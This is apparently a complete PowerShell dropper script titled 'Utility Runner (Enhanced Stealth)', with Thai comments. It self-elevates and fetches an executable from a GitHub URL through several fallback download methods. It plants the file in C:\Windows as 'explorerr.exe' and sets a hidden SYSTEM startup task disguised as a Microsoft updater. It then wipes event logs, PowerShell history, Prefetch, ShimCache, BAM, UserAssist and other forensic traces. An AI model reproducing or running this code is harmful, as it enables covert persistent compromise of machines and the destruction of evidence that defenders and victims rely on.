Write-Host "+ Utility Runner (Enhanced Stealth)"
Write-Host "1. Install & Run"
Write-Host "2. Clean"

$choice = Read-Host "Enter choice (1/2)"

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Restarting with elevated privileges..."
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File '$PSCommandPath'" -Verb RunAs
    exit
}

$InstallPath = $env:windir
$SexeDestination = Join-Path $InstallPath "explorerr.exe" 
$SexeUrl = "https://github.com/Verte225066/test/blob/main/cmd.exe" 
$TaskName = "\Microsoft\Windows\SystemDataUpdater"

function Write-SimulationProgress {
    param(
        [string]$Message,
        [int]$Duration = 3
    )
    Write-Host "$Message " -NoNewline -ForegroundColor Cyan
    for ($i = 0; $i -lt $Duration; $i++) {
        Write-Host "." -NoNewline -ForegroundColor Green
        Start-Sleep -Milliseconds 500
    }
    Write-Host ""
}

function Set-Persistence {
    param(
        [Parameter(Mandatory=$true)]
        [string]$PathToExe
    )
    Write-Host "Starting system service registration..." -ForegroundColor Cyan
    
    $Action = New-ScheduledTaskAction -Execute $PathToExe
    $Trigger = New-ScheduledTaskTrigger -AtStartup
    $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
    $Settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -Hidden

    Write-SimulationProgress -Message "Processing service request" -Duration 4
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Description "Performs critical system data synchronization." -Force | Out-Null
    
    Write-Host "Service registration complete." -ForegroundColor Green
}

function Remove-Persistence {
    param(
        [Parameter(Mandatory=$true)]
        [string]$TaskPath
    )
    Write-Host "Removing system service..."
    if (Get-ScheduledTask -TaskName $TaskPath -ErrorAction SilentlyContinue) {
        Write-SimulationProgress -Message "Unregistering task" -Duration 4
        Unregister-ScheduledTask -TaskName $TaskPath -Confirm:$false
        Write-Host "Task $TaskPath removed." -ForegroundColor Green
    } else {
        Write-Host "Task $TaskPath not found." -ForegroundColor Yellow
    }
}

function Clear-Traces {
    Write-Host "Initiating system cleanup routines..." -ForegroundColor Yellow
    
    Write-SimulationProgress -Message "Running essential maintenance" -Duration 7
    
    try {
        $PSHistoryPath = (Get-PSReadLineOption).HistorySavePath
        Remove-Item $PSHistoryPath -Force -ErrorAction SilentlyContinue
    } catch {}

    try {
        $AutomaticDestinations = Join-Path $env:APPDATA "Microsoft\Windows\Recent\AutomaticDestinations"
        $CustomDestinations = Join-Path $env:APPDATA "Microsoft\Windows\Recent\CustomDestinations"
        Get-ChildItem -Path $AutomaticDestinations -Recurse -Force | Remove-Item -ErrorAction SilentlyContinue
        Get-ChildItem -Path $CustomDestinations -Recurse -Force | Remove-Item -ErrorAction SilentlyContinue
    } catch {}

    try {
        $PrefetchPath = Join-Path $env:windir "Prefetch"
        Get-ChildItem -Path $PrefetchPath -Exclude "Layout.ini" -Recurse -Force | Remove-Item -ErrorAction SilentlyContinue
    } catch {}

    try {
        $RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
        Get-ItemProperty -Path $RunKey -ErrorAction SilentlyContinue | Select-Object * -ExcludeProperty PSPath, PSParentPath, PSChildName, PSDrive, PSProvider, (Get-ItemProperty -Path $RunKey).'(default)', MRUList | ForEach-Object {
            Remove-ItemProperty -Path $RunKey -Name $_.PSProperty.Name -ErrorAction SilentlyContinue
        }
    } catch {}

    Write-Host "  -> Clearing system logs..."
    try {
        Get-WinEvent -ListLog * -ErrorAction SilentlyContinue | ForEach-Object {
            Clear-EventLog -LogName $_.LogName -ErrorAction SilentlyContinue
        }
    } catch {}
    
    Write-Host "  -> Running deep registry cleanup..."
    try {
        $ShimKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache"
        Remove-ItemProperty -Path $ShimKey -Name "AppCompatCache" -ErrorAction SilentlyContinue
    } catch {}

    try {
        $BAMKey = "HKLM:\SYSTEM\CurrentControlSet\Services\bam\UserSettings"
        Remove-Item -Path $BAMKey -Recurse -Force -ErrorAction SilentlyContinue
        $UserAssistKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
        Remove-Item -Path $UserAssistKey -Recurse -Force -ErrorAction SilentlyContinue
    } catch {}

    try {
        Clear-RecycleBin -Force -ErrorAction SilentlyContinue
    } catch {}
    
    Write-Host "System maintenance complete." -ForegroundColor Green
}

function Start-ForcedExecution {
    param(
        [string]$FilePath
    )
    
    Write-Host "Starting forced execution with UI..." -ForegroundColor Yellow
    
    # วิธีที่ 1: พยายามรันปกติด้วย UI
    try {
        Write-Host "Attempting normal execution..." -ForegroundColor Cyan
        Start-Process -FilePath $FilePath -WindowStyle Normal -PassThru -ErrorAction Stop
        Write-Host "Program started successfully (Method 1)." -ForegroundColor Green
        return $true
    } catch {
        Write-Host "Normal execution failed: $($_.Exception.Message)" -ForegroundColor Yellow
    }
    
    # วิธีที่ 2: รันด้วยสิทธิ์สูงสุด
    try {
        Write-Host "Attempting elevated execution..." -ForegroundColor Cyan
        Start-Process -FilePath $FilePath -Verb RunAs -WindowStyle Normal -PassThru -ErrorAction Stop
        Write-Host "Program started successfully (Method 2)." -ForegroundColor Green
        return $true
    } catch {
        Write-Host "Elevated execution failed: $($_.Exception.Message)" -ForegroundColor Yellow
    }
    
    # วิธีที่ 3: ใช้ Process StartInfo
    try {
        Write-Host "Attempting via Process StartInfo..." -ForegroundColor Cyan
        $process = New-Object System.Diagnostics.Process
        $process.StartInfo.FileName = $FilePath
        $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Normal
        $process.StartInfo.UseShellExecute = $true
        $process.Start()
        Write-Host "Program started successfully (Method 3)." -ForegroundColor Green
        return $true
    } catch {
        Write-Host "Process StartInfo failed: $($_.Exception.Message)" -ForegroundColor Yellow
    }
    
    # วิธีที่ 4: ใช้ cmd.exe ในการรัน
    try {
        Write-Host "Attempting via CMD..." -ForegroundColor Cyan
        $cmdArgs = "/c `"$FilePath`""
        Start-Process -FilePath "cmd.exe" -ArgumentList $cmdArgs -WindowStyle Normal -PassThru
        Write-Host "Program started successfully (Method 4)." -ForegroundColor Green
        return $true
    } catch {
        Write-Host "CMD execution failed: $($_.Exception.Message)" -ForegroundColor Yellow
    }
    
    return $false
}

function Invoke-ForcedDownload {
    param(
        [string]$Url,
        [string]$Destination
    )
    
    Write-Host "Starting forced download..." -ForegroundColor Yellow
    
    # วิธีที่ 1: ใช้ Invoke-WebRequest ปกติ
    try {
        Write-Host "Downloading using Invoke-WebRequest..." -ForegroundColor Cyan
        Invoke-WebRequest -Uri $Url -OutFile $Destination -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -ErrorAction Stop
        Write-Host "Download completed (Method 1)." -ForegroundColor Green
        return $true
    } catch {
        Write-Host "Invoke-WebRequest failed: $($_.Exception.Message)" -ForegroundColor Yellow
    }
    
    # วิธีที่ 2: ใช้ WebClient
    try {
        Write-Host "Downloading using WebClient..." -ForegroundColor Cyan
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $webClient.DownloadFile($Url, $Destination)
        Write-Host "Download completed (Method 2)." -ForegroundColor Green
        return $true
    } catch {
        Write-Host "WebClient failed: $($_.Exception.Message)" -ForegroundColor Yellow
    }
    
    # วิธีที่ 3: ใช้ BITS
    try {
        Write-Host "Downloading using BITS..." -ForegroundColor Cyan
        Start-BitsTransfer -Source $Url -Destination $Destination -ErrorAction Stop
        Write-Host "Download completed (Method 3)." -ForegroundColor Green
        return $true
    } catch {
        Write-Host "BITS transfer failed: $($_.Exception.Message)" -ForegroundColor Yellow
    }
    
    return $false
}

if ($choice -eq "1") {
    Write-Host "`nStarting operations..."
    
    Write-Host "Retrieving and preparing executable..."
    try {
        Write-SimulationProgress -Message "Downloading file" -Duration 8
        
        # ลบไฟล์เก่าถ้ามี
        if (Test-Path $SexeDestination) {
            Remove-Item $SexeDestination -Force -ErrorAction SilentlyContinue
        }
        
        # บังคับดาวน์โหลด
        $downloadSuccess = Invoke-ForcedDownload -Url $SexeUrl -Destination $SexeDestination
        
        if (-not $downloadSuccess) {
            Write-Host "CRITICAL: All download methods failed!" -ForegroundColor Red
            exit
        }
        
        # ตรวจสอบว่าไฟล์ถูกดาวน์โหลดสำเร็จ
        if (Test-Path $SexeDestination) {
            $fileSize = (Get-Item $SexeDestination).Length
            Write-Host "File downloaded successfully: $SexeDestination ($([math]::Round($fileSize/1MB, 2)) MB)" -ForegroundColor Green
        } else {
            Write-Host "ERROR: File not found after download!" -ForegroundColor Red
            exit
        }
        
    } catch {
        Write-Host "Installation failed: $_" -ForegroundColor Red
        exit
    }

    # สร้าง persistence
    Set-Persistence -PathToExe $SexeDestination

    Write-Host "Executing core application with UI..."
    try {
        Write-SimulationProgress -Message "Launching application" -Duration 3
        
        # บังคับรันโปรแกรมด้วย UI
        $executionSuccess = Start-ForcedExecution -FilePath $SexeDestination
        
        if ($executionSuccess) {
            Write-Host "Application launched successfully with UI." -ForegroundColor Green
            
            # รอให้ UI โหลด
            Write-SimulationProgress -Message "Waiting for UI to load" -Duration 3
        } else {
            Write-Host "WARNING: Some execution methods failed, but persistence is set." -ForegroundColor Yellow
        }
        
    } catch {
        Write-Host "Execution failed: $_" -ForegroundColor Red
    }
    
    # ล้าง traces
    Clear-Traces

    Write-Host "`nInstallation completed successfully." -ForegroundColor Green

} elseif ($choice -eq "2") {
    Write-Host "Initiating system cleanup..."

    Remove-Persistence -TaskPath $TaskName

    Write-Host "Stopping core application process..."
    try {
        Write-SimulationProgress -Message "Forcing process termination" -Duration 5 
        
        # หยุดทุก process ที่เกี่ยวข้อง
        Get-Process | Where-Object { $_.ProcessName -like "*explorerr*" -or $_.MainWindowTitle -like "*explorerr*" } | Stop-Process -Force -ErrorAction SilentlyContinue
        
        # รอให้ process ถูกปิด
        Start-Sleep -Seconds 3
        
        # ตรวจสอบว่ายังมี process เหลืออยู่ไหม
        $remainingProcesses = Get-Process | Where-Object { $_.ProcessName -like "*explorerr*" }
        if ($remainingProcesses) {
            Write-Host "WARNING: Some processes still running. Forcing termination..." -ForegroundColor Red
            $remainingProcesses | Stop-Process -Force -ErrorAction SilentlyContinue
        }
        
        Write-Host "All processes terminated." -ForegroundColor Green
    } catch {
        Write-Host "No running process found or failed to stop." -ForegroundColor Yellow
    }

    Write-Host "Attempting to remove installed file..."
    if (Test-Path $SexeDestination) {
        try {
            Write-SimulationProgress -Message "Removing file from C:\Windows" -Duration 3
            
            # พยายามลบหลายครั้ง
            for ($i = 1; $i -le 5; $i++) {
                try {
                    Remove-Item $SexeDestination -Force -ErrorAction Stop
                    Write-Host "Removed executable: $SexeDestination (Attempt $i)" -ForegroundColor Green
                    break
                } catch {
                    if ($i -eq 5) {
                        Write-Host "ERROR: Could not remove file after 5 attempts. It may still be locked." -ForegroundColor Red
                    } else {
                        Write-Host "Attempt $i failed, retrying..." -ForegroundColor Yellow
                        Start-Sleep -Seconds 2
                    }
                }
            }
        } catch {
            Write-Host "ERROR: Could not remove file. It may still be locked." -ForegroundColor Red
        }
    } else {
        Write-Host "File not found: $SexeDestination" -ForegroundColor Yellow
    }
    
    Write-Host "Cleanup completed." -ForegroundColor Green

} else {
    Write-Host "Invalid choice." -ForegroundColor Red
}
